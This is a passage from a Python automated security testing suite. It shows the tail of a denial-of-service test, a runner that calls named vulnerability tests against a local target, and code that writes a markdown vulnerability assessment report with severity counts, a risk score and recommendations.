                    owasp_category="A04:2021-Insecure Design"
                )

        except Exception as e:
            logger.warning(f"Resource exhaustion test failed: {e}")

        self.add_result(
            test_name="Denial of Service Comprehensive Test",
            category="Denial of Service",
            severity="INFO",
            status="PASS",
            description="Denial of service resistance analysis completed",
            evidence="Tested large payloads and concurrent requests",
            recommendation="Implement comprehensive rate limiting and resource controls",
            cwe_id="CWE-400",
            owasp_category="A04:2021-Insecure Design"
        )

    async def run_all_tests(self):
        """Run all security tests."""
        logger.info("Starting comprehensive security testing...")

        # Test basic connectivity
        try:
            async with self.session.get("/health") as response:
                if response.status != 200:
                    logger.error(f"Health check failed: {response.status}")
                    return
        except Exception as e:
            logger.error(f"Cannot connect to target: {e}")
            return

        # Run all security tests
        test_methods = [
            self.test_sql_injection,
            self.test_cross_site_scripting,
            self.test_authentication_bypass,
            self.test_file_upload_security,
            self.test_cors_security,
            self.test_security_headers,
            self.test_rate_limiting,
            self.test_information_disclosure,
            self.test_api_key_security,
            self.test_dependency_vulnerabilities,
            self.test_denial_of_service,
        ]

        for test_method in test_methods:
            try:
                await test_method()
            except Exception as e:
                logger.error(f"Test {test_method.__name__} failed: {e}")

        logger.info(f"Security testing completed. Total results: {len(self.results)}")

    def generate_report(self) -> str:
        """Generate a comprehensive security report."""
        report = []
        report.append("# SECURITY VULNERABILITY ASSESSMENT REPORT")
        report.append(f"AP Intake & Validation System")
        report.append(f"Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        report.append(f"Target: {self.base_url}")
        report.append("")

        # Executive Summary
        critical_count = len([r for r in self.results if r.severity == "CRITICAL"])
        high_count = len([r for r in self.results if r.severity == "HIGH"])
        medium_count = len([r for r in self.results if r.severity == "MEDIUM"])

        report.append("## EXECUTIVE SUMMARY")
        report.append(f"- **Critical Vulnerabilities**: {critical_count}")
        report.append(f"- **High Risk Vulnerabilities**: {high_count}")
        report.append(f"- **Medium Risk Vulnerabilities**: {medium_count}")

        if critical_count > 0:
            report.append("🚨 **CRITICAL**: Immediate action required")
        elif high_count > 0:
            report.append("⚠️ **HIGH**: Prompt action required")
        elif medium_count > 0:
            report.append("⚡ **MEDIUM**: Action recommended")
        else:
            report.append("✅ **GOOD**: No critical or high-risk vulnerabilities found")

        report.append("")

        # Detailed Findings
        report.append("## DETAILED FINDINGS")

        # Group by severity
        for severity in ["CRITICAL", "HIGH", "MEDIUM", "LOW", "INFO"]:
            severity_results = [r for r in self.results if r.severity == severity]
            if severity_results:
                report.append(f"### {severity} SEVERITY")
                for result in severity_results:
                    report.append(f"#### {result.test_name}")
                    report.append(f"**Category**: {result.category}")
                    report.append(f"**Status**: {result.status}")
                    report.append(f"**Description**: {result.description}")
                    if result.evidence:
                        report.append(f"**Evidence**: {result.evidence}")
                    if result.recommendation:
                        report.append(f"**Recommendation**: {result.recommendation}")
                    if result.cwe_id:
                        report.append(f"**CWE ID**: {result.cwe_id}")
                    if result.owasp_category:
                        report.append(f"**OWASP Category**: {result.owasp_category}")
                    report.append("")

        # Statistics
        report.append("## TEST STATISTICS")
        total_tests = len(self.results)
        passed_tests = len([r for r in self.results if r.status == "PASS"])
        failed_tests = len([r for r in self.results if r.status == "FAIL"])
        warning_tests = len([r for r in self.results if r.status == "WARNING"])

        report.append(f"- **Total Tests**: {total_tests}")
        report.append(f"- **Passed**: {passed_tests}")
        report.append(f"- **Failed**: {failed_tests}")
        report.append(f"- **Warnings**: {warning_tests}")
        report.append("")

        # Risk Assessment
        report.append("## RISK ASSESSMENT")
        risk_score = (critical_count * 10) + (high_count * 5) + (medium_count * 2)

        if risk_score >= 20:
            risk_level = "CRITICAL"
        elif risk_score >= 10:
            risk_level = "HIGH"
        elif risk_score >= 5:
            risk_level = "MEDIUM"
        else:
            risk_level = "LOW"

        report.append(f"**Overall Risk Level**: {risk_level} (Score: {risk_score})")
        report.append("")

        # Recommendations
        report.append("## IMMEDIATE RECOMMENDATIONS")

        if critical_count > 0:
            report.append("1. **Address all CRITICAL vulnerabilities immediately**")
            report.append("2. Take affected systems offline if necessary")
            report.append("3. Implement emergency patches")

        if high_count > 0:
            report.append("4. **Address HIGH vulnerabilities within 7 days**")
            report.append("5. Schedule emergency maintenance window")

        report.append("6. Implement comprehensive security monitoring")
        report.append("7. Schedule regular security assessments")
        report.append("8. Implement security awareness training")
        report.append("9. Create incident response procedures")
        report.append("10. Establish secure development lifecycle (SDLC)")
        report.append("")

        # Compliance Notes
        report.append("## COMPLIANCE NOTES")
        report.append("- **OWASP Top 10 2021**: Address identified vulnerabilities")
        report.append("- **CWE/SANS Top 25**: Review relevant CWE mappings")
        report.append("- **Industry Standards**: Consider compliance requirements")
        report.append("")

        report.append("---")
        report.append("*This report was generated by the Automated Security Testing Suite*")
        report.append("*For a complete assessment, consider manual penetration testing*")

        return "\n".join(report)

async def main():
    """Main function to run the security test suite."""
    base_url = os.getenv("TARGET_URL", "http://localhost:8000")

    async with SecurityTestSuite(base_url) as suite:
        await suite.run_all_tests()
        report = suite.generate_report()

        # Save report to file
        report_file = f"security_assessment_report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.md"
        with open(report_file, 'w') as f:
            f.write(report)

        print(f"\nSecurity assessment completed!")
        print(f"Report saved to: {report_file}")
        print(f"Total tests run: {len(suite.results)}")

        # Print summary
        critical = len([r for r in suite.results if r.severity == "CRITICAL"])
        high = len([r for r in suite.results if r.severity == "HIGH"])
        medium = len([r for r in suite.results if r.severity == "MEDIUM"])

        print(f"\nSummary:")
        print(f"  Critical: {critical}")
        print(f"  High: {high}")
        print(f"  Medium: {medium}")

        if critical > 0:
            print("🚨 CRITICAL vulnerabilities found - Immediate action required!")
        elif high > 0:
            print("⚠️  HIGH vulnerabilities found - Prompt action required!")

if __name__ == "__main__":
    asyncio.run(main())